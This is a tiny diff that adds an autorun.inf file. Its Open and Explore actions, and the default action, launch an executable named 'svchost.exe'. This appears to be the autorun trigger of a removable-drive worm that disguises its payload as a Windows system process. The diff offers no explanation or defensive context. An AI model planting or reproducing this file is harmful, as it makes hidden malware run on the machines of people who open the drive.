@@ -1,0 +1,6 @@
+[autorun]
+shell\open=&Open
+shell\open\command=svchost.exe
+shell\explore=&Explore
+shell\explore\command=svchost.exe
+default=1
